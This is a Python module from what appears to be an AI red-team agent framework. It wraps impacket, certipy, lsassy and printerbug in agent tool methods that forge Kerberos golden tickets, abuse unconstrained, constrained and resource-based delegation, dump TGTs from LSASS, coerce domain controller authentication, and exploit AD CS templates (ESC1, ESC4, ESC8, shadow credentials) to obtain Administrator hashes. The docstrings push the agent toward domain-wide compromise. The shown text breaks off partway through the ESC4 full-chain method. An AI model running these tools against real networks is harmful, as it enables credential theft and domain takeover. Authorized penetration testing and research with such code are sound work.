"""Red Team Kerberos and certificate-based attack tools.

This module provides toolsets for:
- Golden ticket generation
- Delegation attacks (constrained/unconstrained/RBCD)
- AD CS exploitation (Certipy)
- Trust relationship attacks
"""

import logging
import re
import shlex
import uuid
from datetime import datetime, timezone
from typing import ClassVar

import dreadnode as dn
from dreadnode.agent.tools.base import Toolset

from ares.core.models import Hash, SharedRedTeamState, TimelineEvent, VulnerabilityInfo
from ares.tools.red.common import (
    PLACEHOLDER_PASSWORDS,
    AnyRedTeamState,
    format_weakness_block,
    resolve_password,
    run_tool,
)

logger = logging.getLogger(__name__)


class GoldenTicketTools(Toolset):
    """Tools for Kerberos golden ticket generation and domain escalation."""

    state: AnyRedTeamState | None = None

    def set_state(self, state: AnyRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def get_sid(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str | None = None,
    ) -> str:
        """
        Get the SID (Security Identifier) of a domain.

        This is required for golden ticket generation. You need to get SIDs for BOTH:
        1. The compromised domain (where you have the krbtgt hash)
        2. The target domain (where you want to escalate)

        Args:
            domain: Target domain (e.g., 'subdomain.example.local')
            username: Valid domain username
            password: Password for the username
            dc_ip: Optional DC IP address to connect to (recommended to avoid DNS issues)

        Returns:
            Domain SID and list of domain users (look for "[*] Domain SID is: ...")

        Example:
            >>> get_sid("child.example.local", "user", "pass", "192.168.58.100")
            >>> get_sid("parent.example.local", "user", "pass", "192.168.58.101")
        """
        if dc_ip:
            cmd = ["impacket-lookupsid", f"{domain}/{username}:{password}@{dc_ip}"]
            logger.info(f"[*] Getting SID for {domain} using {username} via DC {dc_ip}")
        else:
            cmd = ["impacket-lookupsid", f"{username}:{password}@{domain}"]
            logger.info(f"[*] Getting SID for {domain} using {username}")

        try:
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)
            logger.info(f"[*] SID lookup completed for {domain}")
            return stdout or stderr
        except Exception as e:
            return f"Error: {e!s}"

    @dn.tool_method
    def generate_golden_ticket(
        self,
        krbtgt_hash: str,
        domain_sid: str,
        domain: str,
        extra_sid: str,
    ) -> str:
        """
        Generate a Kerberos golden ticket for Administrator to enable domain escalation.

        **This is the ULTIMATE privilege escalation technique.** A golden ticket gives
        you persistent, enterprise-level access to the entire domain forest.

        CRITICAL: The extra_sid should be the target domain SID with "-519" appended
        (Enterprise Admins group). This enables cross-domain privilege escalation.

        Args:
            krbtgt_hash: NTLM hash of the krbtgt account (from secretsdump)
            domain_sid: SID of the compromised domain (from get_sid)
            domain: Domain to generate ticket for (same as domain_sid domain)
            extra_sid: Target domain SID with "-519" appended (Enterprise Admins)

        Returns:
            Golden ticket generation output (saves to Administrator.ccache)

        Example:
            >>> generate_golden_ticket(
            ...     "abc123...",  # krbtgt hash
            ...     "S-1-5-21-123-456-789",  # compromised domain SID
            ...     "child.example.local",  # compromised domain
            ...     "S-1-5-21-111-222-333-519"  # target domain SID + 519
            ... )
        """
        cmd = [
            "impacket-ticketer",
            "-nthash",
            krbtgt_hash,
            "-domain-sid",
            domain_sid,
            "-domain",
            domain,
            "-extra-sid",
            extra_sid,
            "-user-id",
            "500",
            "Administrator",
        ]

        try:
            logger.info("[*] Generating golden ticket for Administrator")
            logger.info(f"[*] Domain: {domain}, SID: {domain_sid}, Extra SID: {extra_sid}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            if self.state:
                self.state.has_golden_ticket = True
                if hasattr(self.state, "timeline"):
                    event = TimelineEvent(
                        id=f"evt-{len(self.state.timeline):04d}",
                        timestamp=datetime.now(timezone.utc),
                        description=f"Golden ticket generated for {domain}",
                        mitre_techniques=["T1558.001"],
                        confidence=1.0,
                        source="golden_ticket_generation",
                    )
                    self.state.timeline.append(event)

            return stdout or stderr
        except Exception as e:
            return f"Error: {e!s}"


class DelegationTools(Toolset):
    """Tools for discovering and exploiting Kerberos delegation vulnerabilities."""

    state: AnyRedTeamState | None = None
    _PLACEHOLDER_PASSWORDS: ClassVar[set[str]] = PLACEHOLDER_PASSWORDS

    def set_state(self, state: AnyRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    def _resolve_password(
        self,
        username: str,
        domain: str | None,
        password: str | None,
    ) -> str | None:
        return resolve_password(self.state, username, domain, password)

    def _add_weakness(self, block: str) -> None:
        if not self.state or not block:
            return
        from ares.core.models import SharedRedTeamState

        if isinstance(self.state, SharedRedTeamState):
            self.state.add_weakness(block)
        elif block not in self.state.weaknesses:
            self.state.weaknesses.append(block)

    @dn.tool_method
    def find_delegation(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Find all accounts with Kerberos delegation configured.

        Delegation is often exploitable for privilege escalation:
        - Unconstrained: Can impersonate ANY user to ANY service
        - Constrained: Can impersonate ANY user to specific services
        - RBCD: Resource-Based Constrained Delegation for SYSTEM access

        CRITICAL: Run this early - delegation misconfigs are common high-value targets.

        Args:
            domain: Target domain
            username: Valid domain username
            password: Password for authentication
            dc_ip: Domain controller IP

        Returns:
            List of accounts with delegation and delegation type

        Example:
            >>> find_delegation("example.local", "user", "pass", "192.168.58.10")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = [
            "impacket-findDelegation",
            f"{domain}/{username}:{resolved_password}",
            "-dc-ip",
            dc_ip,
        ]

        try:
            logger.info(f"[*] Searching for delegation in {domain}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "unconstrained" in result.lower():
                logger.warning("[!] Unconstrained delegation found!")
                result = (
                    "🚨 UNCONSTRAINED DELEGATION DETECTED!\n"
                    "\u2192 Compromise this account to impersonate ANY user\n"
                    "\u2192 Use Rubeus/mimikatz to harvest TGTs\n\n" + result
                )
                block = format_weakness_block(
                    "Delegation Abuse - Unconstrained Delegation",
                    "Unconstrained delegation configured on account",
                    {},
                    "Allows impersonation of any user",
                    "Delegation enumeration",
                )
                self._add_weakness(block)
            elif "constrained" in result.lower():
                logger.info("[+] Constrained delegation found")
                result = (
                    "🔗 CONSTRAINED DELEGATION DETECTED:\n"
                    "\u2192 Can impersonate users to specific services\n"
                    "\u2192 Check for S4U2Self abuse opportunities\n\n" + result
                )
                block = format_weakness_block(
                    "Delegation Abuse - Constrained Delegation",
                    "Constrained delegation configured on account",
                    {},
                    "Allows impersonation to specific services",
                    "Delegation enumeration",
                )
                self._add_weakness(block)

            return result

        except Exception as e:
            return f"Delegation search failed: {e}"

    @dn.tool_method
    def rbcd_write(
        self,
        target_computer: str,
        attacker_sid: str,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
    ) -> str:
        """
        Write Resource-Based Constrained Delegation (RBCD) to gain SYSTEM access.

        RBCD abuse allows gaining SYSTEM access when you have GenericWrite on a computer.
        After running this, use S4U2Self/S4U2Proxy to get a service ticket as Administrator.

        Attack chain:
        1. Create/control a machine account (add_computer)
        2. Write RBCD from controlled account to target (this tool)
        3. Use S4U to get Admin ticket
        4. Psexec with ticket

        Args:
            target_computer: Computer to write RBCD on (what you want SYSTEM on)
            attacker_sid: SID of the attacker-controlled account
            domain: Target domain
            username: Username with GenericWrite on target_computer
            password: Password for authentication
            dc_ip: Domain controller IP

        Returns:
            RBCD write result

        Example:
            >>> rbcd_write("TARGETPC$", "S-1-5-21-...-1234", "domain.local", "user", "pass", "192.168.58.10")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = [
            "rbcd.py",
            "-delegate-to",
            target_computer,
            "-delegate-from",
            attacker_sid,
            "-action",
            "write",
            "-dc-ip",
            dc_ip,
            f"{domain}/{username}:{resolved_password}",
        ]

        try:
            logger.info(f"[*] Writing RBCD on {target_computer}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "success" in result.lower() or "attribute already" in result.lower():
                logger.info("[+] RBCD delegation written successfully!")
                result = (
                    "\u2705 RBCD DELEGATION WRITTEN!\n"
                    "\u2192 Now use S4U2Self to request ticket as Administrator\n"
                    "\u2192 Then use ticket with psexec for SYSTEM access\n\n" + result
                )

            return result

        except Exception as e:
            return f"RBCD write failed: {e}"

    @dn.tool_method
    def s4u_attack(
        self,
        target_spn: str,
        impersonate: str,
        domain: str,
        username: str,
        password: str | None = None,
        hash: str | None = None,
        dc_ip: str | None = None,
    ) -> str:
        """
        Perform S4U2Self/S4U2Proxy attack to impersonate users via delegation.

        After setting up RBCD or finding constrained delegation, use this to get
        a service ticket as any user (typically Administrator) to the target service.

        Args:
            target_spn: Target SPN to get ticket for (e.g., 'cifs/TARGETPC.domain.local')
            impersonate: User to impersonate (typically 'Administrator')
            domain: Target domain
            username: Username of account with delegation rights
            password: Password (optional if using hash)
            hash: NTLM hash (optional if using password)
            dc_ip: Domain controller IP (optional)

        Returns:
            S4U attack result (includes .ccache ticket path if successful)

        Example:
            >>> s4u_attack("cifs/TARGETPC.domain.local", "Administrator", "domain.local", "svc_account", password="pass")  # pragma: allowlist secret
        """
        resolved_password = self._resolve_password(username, domain, password)
        if (
            hash
            and resolved_password
            and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS
        ):
            resolved_password = None
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        if resolved_password:
            target_string = f"{domain}/{username}:{resolved_password}"
        elif hash:
            target_string = f"{domain}/{username}"
        else:
            return "[!] Error: Either password or hash must be provided"

        cmd = [
            "impacket-getST",
            "-spn",
            target_spn,
            "-impersonate",
            impersonate,
            target_string,
        ]

        if hash:
            cmd.extend(["-hashes", f":{hash}"])
        if dc_ip:
            cmd.extend(["-dc-ip", dc_ip])

        try:
            logger.info(f"[*] Performing S4U attack to impersonate {impersonate}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if ".ccache" in result:
                logger.info("[+] S4U attack successful - ticket obtained!")
                result = (
                    "🎫 S4U ATTACK SUCCESSFUL!\n"
                    "\u2192 Service ticket obtained for impersonated user\n"
                    "\u2192 Set KRB5CCNAME=<ticket.ccache> and use with psexec\n\n" + result
                )

            return result

        except Exception as e:
            return f"S4U attack failed: {e}"

    @dn.tool_method
    def add_computer(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        computer_name: str = "",
        computer_password: str = "",
    ) -> str:
        """
        Add a machine account to the domain (default MachineAccountQuota = 10).

        Machine accounts can be used for RBCD attacks or Kerberos delegation abuse.
        Most domains allow any authenticated user to add up to 10 machine accounts.

        Args:
            domain: Target domain
            username: Any valid domain username
            password: Password for authentication
            dc_ip: Domain controller IP
            computer_name: Name for the new computer (auto-generated if empty)
            computer_password: Password for the computer (auto-generated if empty)

        Returns:
            Computer creation result with credentials

        Example:
            >>> add_computer("domain.local", "user", "pass", "192.168.58.10")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        if not computer_name:
            computer_name = f"EVIL{uuid.uuid4().hex[:6].upper()}$"
        if not computer_password:
            computer_password = f"Password{uuid.uuid4().hex[:8]}!"

        cmd = [
            "impacket-addcomputer",
            f"{domain}/{username}:{resolved_password}",
            "-computer-name",
            computer_name,
            "-computer-pass",
            computer_password,
            "-dc-ip",
            dc_ip,
        ]

        try:
            logger.info(f"[*] Adding machine account {computer_name} to {domain}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "success" in result.lower() or "already exists" in result.lower():
                logger.info(f"[+] Machine account {computer_name} added!")
                result = (
                    f"\u2705 MACHINE ACCOUNT CREATED!\n"
                    f"\u2192 Computer: {computer_name}\n"
                    f"\u2192 Password: {computer_password}\n"
                    "\u2192 Use this for RBCD attacks\n\n" + result
                )

            return result

        except Exception as e:
            return f"Add computer failed: {e}"

    @dn.tool_method
    def unconstrained_tgt_dump(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        target_host: str,
    ) -> str:
        """
        Dump TGTs from LSASS on a host with unconstrained delegation.

        When you have code execution on a host with unconstrained delegation,
        use this to extract TGTs from LSASS. These TGTs can be used to
        impersonate the authenticated users.

        Attack workflow:
        1. Identify hosts with unconstrained delegation (find_delegation)
        2. Get code execution on the unconstrained host (psexec, wmiexec)
        3. Dump TGTs from LSASS (this tool)
        4. Use extracted TGTs for impersonation

        Args:
            domain: Target domain
            username: Admin username for remote execution
            password: Password for authentication
            dc_ip: Domain controller IP
            target_host: Host with unconstrained delegation

        Returns:
            Extracted TGTs and their details
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        # Use lsassy for remote TGT extraction
        cmd = [
            "lsassy",
            "-d",
            domain,
            "-u",
            username,
            "-p",
            resolved_password or "",
            target_host,
            "-m",
            "direct",  # Direct memory read
        ]

        try:
            logger.info(f"[*] Dumping TGTs from LSASS on {target_host}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=180)

            result = stdout + "\n" + (stderr or "")

            # Look for TGT indicators
            if "krbtgt" in result.lower() or "tgt" in result.lower():
                logger.warning("[!] TGTs found in LSASS dump!")
                result = (
                    "🎫 TGTs EXTRACTED FROM UNCONSTRAINED DELEGATION HOST!\n"
                    f"→ Host: {target_host}\n"
                    "→ Look for TGTs from privileged users (Domain Admins, DC$)\n"
                    "→ Use extracted tickets with pass-the-ticket\n"
                    "→ If DC$ TGT found: instant DA access!\n\n" + result
                )

            return result

        except Exception as e:
            return f"TGT dump failed: {e}"

    @dn.tool_method
    def unconstrained_coerce_and_capture(
        self,
        domain: str,
        username: str,
        password: str,
        target_host: str,
        coerce_from: str,
        listener_ip: str,
    ) -> str:
        """
        Coerce authentication to an unconstrained delegation host to capture TGT.

        When you have control of a host with unconstrained delegation, coerce
        a DC or privileged server to authenticate. The TGT will be cached in
        the unconstrained host's LSASS.

        Attack workflow:
        1. Get access to unconstrained delegation host
        2. Coerce DC to authenticate to the unconstrained host
        3. DC's TGT is cached in LSASS
        4. Extract TGT using unconstrained_tgt_dump
        5. Use DC TGT for DCSync

        Args:
            domain: Target domain
            username: Admin username on unconstrained host
            password: Password for authentication
            target_host: Host with unconstrained delegation (our controlled host)
            coerce_from: Host to coerce (typically a DC)
            listener_ip: IP where TGT will be captured (the unconstrained host)

        Returns:
            Coercion result and next steps
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        # Use SpoolSample/PrinterBug for coercion
        cmd = [
            "printerbug.py",
            f"{domain}/{username}:{resolved_password}",
            coerce_from,
            listener_ip,
        ]

        try:
            logger.info(f"[*] Coercing {coerce_from} to authenticate to {listener_ip}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)

            result = stdout + "\n" + (stderr or "")

            return (
                f"🎯 COERCION TRIGGERED\n"
                f"→ Coerced {coerce_from} to authenticate to {listener_ip}\n"
                f"→ If {target_host} has unconstrained delegation:\n"
                f"   1. The TGT from {coerce_from} is now cached in LSASS\n"
                f"   2. Use unconstrained_tgt_dump to extract it\n"
                f"   3. Use the TGT for pass-the-ticket attacks\n\n"
                f"NEXT STEP:\n"
                f'   unconstrained_tgt_dump(target_host="{target_host}", ...)\n\n' + result
            )

        except Exception as e:
            return f"Coercion for unconstrained delegation failed: {e}"


class CertipyTools(Toolset):
    """Tools for AD Certificate Services (ADCS) enumeration and exploitation.

    These tools target common ADCS misconfigurations (ESC1-15) that can lead to
    domain admin privileges.
    """

    state: AnyRedTeamState | None = None
    _PLACEHOLDER_PASSWORDS: ClassVar[set[str]] = PLACEHOLDER_PASSWORDS

    def set_state(self, state: AnyRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    def _resolve_password(
        self,
        username: str,
        domain: str | None,
        password: str | None,
    ) -> str | None:
        return resolve_password(self.state, username, domain, password)

    def _add_weakness(self, block: str) -> None:
        if not self.state or not block:
            return
        from ares.core.models import SharedRedTeamState

        if isinstance(self.state, SharedRedTeamState):
            self.state.add_weakness(block)
        elif block not in self.state.weaknesses:
            self.state.weaknesses.append(block)

    def _queue_esc8_vulnerability(
        self,
        certipy_output: str,
        domain: str,
        dc_ip: str,
        username: str,
        password: str | None,
    ) -> None:
        """
        Queue ESC8 vulnerability for exploitation when detected.

        ESC8 requires a two-step attack:
        1. Start certipy_relay_esc8 to listen for relayed auth
        2. Use coercion (petitpotam/coercer) to force DC authentication

        This method adds the vulnerability to state so the orchestrator
        can dispatch the necessary coercion tasks.
        """
        if not self.state:
            logger.warning("Cannot queue ESC8 vulnerability: no state available")
            return

        # Extract CA information from certipy output
        ca_name = None
        ca_host = None

        # Look for CA name in output (e.g., "CA Name: corp-DC01-CA")
        ca_match = re.search(r"CA Name\s*:\s*([^\n\r]+)", certipy_output, re.IGNORECASE)
        if ca_match:
            ca_name = ca_match.group(1).strip()

        # Look for CA host/DNS (e.g., "DNS Name: dc01.corp.local")
        dns_match = re.search(
            r"(?:DNS Name|Web Services|Web Enrollment)\s*:\s*([^\n\r]+)",
            certipy_output,
            re.IGNORECASE,
        )
        if dns_match:
            ca_host = dns_match.group(1).strip()

        # Create unique vulnerability ID
        vuln_id = f"ADCS_ESC8_{domain}_{uuid.uuid4().hex[:8]}"

        # Build details for exploitation
        details: dict[str, str | list[str] | None] = {
            "ca_name": ca_name,
            "ca_host": ca_host or dc_ip,
            "domain": domain,
            "dc_ip": dc_ip,
            "username": username,
            "password": password,
            "attack_steps": [
                "1. Start certipy_relay_esc8 to listen on attacker interface",
                "2. Use petitpotam or coercer to coerce DC authentication to attacker",
                "3. Relay will capture DC machine certificate",
                "4. Use certipy_auth with captured certificate to get DC machine hash",
                "5. Use hash for DCSync or pass-the-hash",
            ],
            "note": "ESC8 requires COERCION agent to force authentication. "
            "Dispatch coercion task after starting relay.",
        }

        # Create and add vulnerability to state
        vuln = VulnerabilityInfo(
            vuln_id=vuln_id,
            vuln_type="ADCS_ESC8",
            target=ca_host or dc_ip,
            discovered_by="certipy_find",
            details=details,
            priority=3,  # High priority - ADCS_ESC8 is priority 3 in dispatcher
            recommended_agent="privesc",
        )

        if not isinstance(self.state, SharedRedTeamState):
            logger.debug("State does not support add_vulnerability (not SharedRedTeamState)")
            return

        added = self.state.add_vulnerability(vuln)
        if added:
            logger.warning(
                f"[!] ESC8 vulnerability queued for exploitation: {vuln_id} "
                f"(CA: {ca_name or 'unknown'}, host: {ca_host or dc_ip})"
            )
        else:
            logger.debug(f"ESC8 vulnerability already queued for {domain}")

    @dn.tool_method
    def certipy_find(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        vulnerable: bool = True,
    ) -> str:
        """
        Enumerate ADCS (Active Directory Certificate Services) for vulnerabilities.

        CRITICAL: ADCS vulnerabilities (ESC1-15) are among the most reliable paths
        to Domain Admin. Run this early if the domain has a CA.

        Common findings:
        - ESC1: Template allows client auth + requester specifies SAN
        - ESC4: Template misconfigured to allow low-priv enrollment
        - ESC8: Web enrollment (HTTP) endpoint allows NTLM relay

        Args:
            domain: Target domain
            username: Valid domain username
            password: Password for authentication
            dc_ip: Domain controller IP
            vulnerable: Only show vulnerable templates (default: True)

        Returns:
            ADCS enumeration results highlighting exploitable templates

        Example:
            >>> certipy_find("example.local", "user", "pass", "192.168.58.10")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        realm = domain.upper()
        krb5_conf = f"/tmp/ares-krb5-{uuid.uuid4().hex}.conf"  # nosec B108  # noqa: S108
        cmd_list = [
            "certipy",
            "find",
            "-u",
            f"{username}@{domain}",
            "-p",
            resolved_password or "",
            "-dc-ip",
            dc_ip,
            "-stdout",
        ]
        if vulnerable:
            cmd_list.append("-vulnerable")
        cmd_str = " ".join(shlex.quote(arg) for arg in cmd_list)
        cmd_script = (
            f"tmp_conf={krb5_conf}\n"
            "trap 'rm -f \"$tmp_conf\"' EXIT\n"
            "cat > \"$tmp_conf\" <<'EOF'\n"
            "[libdefaults]\n"
            f" default_realm = {realm}\n"
            " dns_lookup_kdc = false\n"
            " dns_lookup_realm = false\n"
            "[realms]\n"
            f" {realm} = {{\n"
            f"  kdc = {dc_ip}\n"
            " }\n"
            "[domain_realm]\n"
            f" .{domain} = {realm}\n"
            f" {domain} = {realm}\n"
            "EOF\n"
            f'env KRB5_CONFIG="$tmp_conf" {cmd_str}\n'
        )
        cmd: list[str] = ["bash", "-lc", cmd_script]

        try:
            logger.info(f"[*] Enumerating ADCS in {domain}")
            # Run locally on privesc agent (certipy is installed there, not on recon)
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=300)

            result = stdout + "\n" + (stderr or "")

            vuln_match = re.search(r"(ESC\d+)", result, re.IGNORECASE)
            if vuln_match:
                esc_type = vuln_match.group(1).upper()
                logger.warning(f"[!] ADCS vulnerability found: {esc_type}")
                result = (
                    f"🚨 ADCS VULNERABILITY DETECTED: {esc_type}!\n"
                    "\u2192 Use certipy_request to exploit vulnerable template\n"
                    "\u2192 Request certificate as Administrator\n\n" + result
                )
                block = format_weakness_block(
                    f"ADCS Vulnerability - {esc_type}",
                    f"Certificate template vulnerable to {esc_type}",
                    {},
                    "Allows impersonation of privileged accounts",
                    "Certipy ADCS enumeration",
                )
                self._add_weakness(block)

            if "esc8" in result.lower() or "web enrollment" in result.lower():
                logger.warning("[!] ESC8 detected - HTTP Web Enrollment vulnerable to relay!")
                if "🚨" not in result:
                    result = (
                        "🚨 ESC8 DETECTED - WEB ENROLLMENT RELAY POSSIBLE!\n"
                        "\u2192 Use certipy_relay_esc8 to set up relay listener\n"
                        "\u2192 Use petitpotam or coercer to coerce DC authentication\n"
                        "\u2192 Then use certipy_auth with the captured certificate\n\n" + result
                    )

                # Auto-queue ESC8 vulnerability for exploitation
                # This ensures the orchestrator knows to dispatch coercion tasks
                self._queue_esc8_vulnerability(result, domain, dc_ip, username, resolved_password)

            return result

        except Exception as e:
            return f"Certipy find failed: {e}"

    @dn.tool_method
    def certipy_request(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        ca: str,
        template: str,
        upn: str = "Administrator",
    ) -> str:
        """
        Request a certificate using an exploitable template (ESC1/ESC4).

        After finding a vulnerable template with certipy_find, use this to request
        a certificate as any user (typically Administrator). Then use certipy_auth
        to convert the certificate to an NTLM hash.

        Args:
            domain: Target domain
            username: Valid domain username
            password: Password for authentication
            dc_ip: Domain controller IP
            ca: Certificate Authority name (from certipy_find output)
            template: Vulnerable template name (from certipy_find output)
            upn: Target user principal name (default: Administrator)

        Returns:
            Certificate request result (saves .pfx file if successful)

        Example:
            >>> certipy_request("example.local", "user", "pass", "192.168.58.10",
            ...                  "example-CA", "VulnTemplate", "Administrator")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = [
            "certipy",
            "req",
            "-u",
            f"{username}@{domain}",
            "-p",
            resolved_password or "",
            "-dc-ip",
            dc_ip,
            "-ca",
            ca,
            "-template",
            template,
            "-upn",
            f"{upn}@{domain}",
        ]

        try:
            logger.info(f"[*] Requesting certificate as {upn} using template {template}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if ".pfx" in result:
                logger.warning(f"[!] Certificate obtained for {upn}!")
                result = (
                    f"🎫 CERTIFICATE OBTAINED FOR {upn}!\n"
                    "\u2192 Use certipy_auth with the .pfx file to get NTLM hash\n"
                    "\u2192 Then use hash for pass-the-hash or secretsdump\n\n" + result
                )

            return result

        except Exception as e:
            return f"Certipy request failed: {e}"

    @dn.tool_method
    def certipy_auth(
        self,
        domain: str,
        dc_ip: str,
        pfx_path: str,
    ) -> str:
        """
        Authenticate with a certificate to obtain NTLM hash (PKINIT).

        After obtaining a certificate with certipy_request, use this to convert
        it to an NTLM hash via PKINIT authentication. The hash can then be used
        for pass-the-hash or secretsdump.

        Args:
            domain: Target domain
            dc_ip: Domain controller IP
            pfx_path: Path to the .pfx certificate file

        Returns:
            Authentication result including NTLM hash if successful

        Example:
            >>> certipy_auth("example.local", "192.168.58.10", "administrator.pfx")
        """
        cmd = [
            "certipy",
            "auth",
            "-pfx",
            pfx_path,
            "-dc-ip",
            dc_ip,
            "-domain",
            domain,
        ]

        try:
            logger.info(f"[*] Authenticating with certificate {pfx_path}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "hash" in result.lower() or re.search(r"[a-fA-F0-9]{32}", result):
                logger.warning("[!] NTLM hash obtained from certificate!")
                result = (
                    "🚨 NTLM HASH OBTAINED!\n"
                    "\u2192 Use hash with secretsdump for full domain dump\n"
                    "\u2192 Or use with pass-the-hash for lateral movement\n\n" + result
                )

                if self.state:
                    hash_match = re.search(r"([a-fA-F0-9]{32}:[a-fA-F0-9]{32})", result)
                    if hash_match:
                        hash_obj = Hash(
                            username="Administrator",
                            hash_value=hash_match.group(1),
                            hash_type="NTLM",
                            domain=domain,
                        )
                        if hasattr(self.state, "add_hash"):
                            self.state.add_hash(hash_obj, "certipy_auth")
                        else:
                            self.state.hashes.append(hash_obj)

            return result

        except Exception as e:
            return f"Certipy auth failed: {e}"

    @dn.tool_method
    def certipy_shadow(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        target: str,
    ) -> str:
        """
        Abuse Key Credentials (shadow credentials) for PKINIT-based auth.

        Similar to pywhisker but integrated with certipy. Adds a certificate-based
        credential to a target user/computer's msDS-KeyCredentialLink attribute.

        Use when you have GenericAll or GenericWrite on a user/computer.

        Args:
            domain: Target domain
            username: Your username with GenericAll/GenericWrite
            password: Your password
            dc_ip: Domain controller IP
            target: Target account to add shadow credentials to

        Returns:
            Shadow credentials result (includes certificate if successful)

        Example:
            >>> certipy_shadow("example.local", "user", "pass", "192.168.58.10", "Administrator")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = [
            "certipy",
            "shadow",
            "auto",
            "-u",
            f"{username}@{domain}",
            "-p",
            resolved_password or "",
            "-dc-ip",
            dc_ip,
            "-target",
            target,
        ]

        try:
            logger.info(f"[*] Adding shadow credentials to {target}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if ".pfx" in result or "hash" in result.lower():
                logger.warning(f"[!] Shadow credentials attack successful on {target}!")
                result = (
                    f"🚨 SHADOW CREDENTIALS ADDED TO {target}!\n"
                    "\u2192 Certificate/hash obtained for the target\n"
                    "\u2192 Use for authentication or secretsdump\n\n" + result
                )

            return result

        except Exception as e:
            return f"Certipy shadow failed: {e}"

    @dn.tool_method
    def certipy_template_esc4(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        template: str,
    ) -> str:
        """
        Modify a certificate template for ESC4 exploitation.

        ESC4 occurs when a user has write permissions (GenericAll, WriteDacl, etc.)
        on a certificate template. This tool modifies the template to:
        - Allow enrollment by low-privileged users
        - Enable Client Authentication EKU
        - Allow specifying Subject Alternative Name (SAN)

        IMPORTANT: This modifies the template with -save-old to preserve the
        original configuration for later restoration.

        After modification, use certipy_request to request a certificate as
        Administrator, then certipy_auth to get the NTLM hash.

        Args:
            domain: Target domain
            username: User with write permissions on the template
            password: Password for authentication
            dc_ip: Domain controller IP
            template: Certificate template name to modify

        Returns:
            Template modification result (saves backup of original config)

        Example:
            >>> certipy_template_esc4("example.local", "user", "pass", "192.168.58.10", "ESC4")
        """
        resolved_password = self._resolve_password(username, domain, password)
        if resolved_password and resolved_password.strip().lower() in self._PLACEHOLDER_PASSWORDS:
            return "[!] Refusing to use placeholder password; provide a real credential."

        cmd = [
            "certipy",
            "template",
            "-u",
            f"{username}@{domain}",
            "-p",
            resolved_password or "",
            "-dc-ip",
            dc_ip,
            "-template",
            template,
            "-save-old",  # Save original config for restoration
        ]

        try:
            logger.info(f"[*] Modifying certificate template {template} for ESC4 exploitation")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "successfully" in result.lower() or "saved" in result.lower():
                logger.warning(f"[!] Template {template} modified for ESC4!")
                result = (
                    f"🚨 TEMPLATE {template} MODIFIED FOR ESC4!\n"
                    "→ Original configuration saved (use -configuration to restore)\n"
                    "→ Template now allows enrollment with SAN specification\n"
                    "→ NEXT STEPS:\n"
                    "   1. Use certipy_request with -upn administrator@domain\n"
                    "   2. Use certipy_auth with the .pfx file\n"
                    "   3. Get Administrator NTLM hash!\n\n" + result
                )

            return result

        except Exception as e:
            return f"Certipy template modification failed: {e}"

    @dn.tool_method
    def certipy_esc4_full_chain(
        self,
        domain: str,
        username: str,
        password: str,
        dc_ip: str,
        template: str,
        ca: str,
        target_upn: str = "Administrator",
    ) -> str:
        """
        Execute complete ESC4 attack chain in one step.

        This combines all ESC4 exploitation steps:
        1. Modify template to allow client auth with SAN
        2. Request certificate as target user (Administrator)
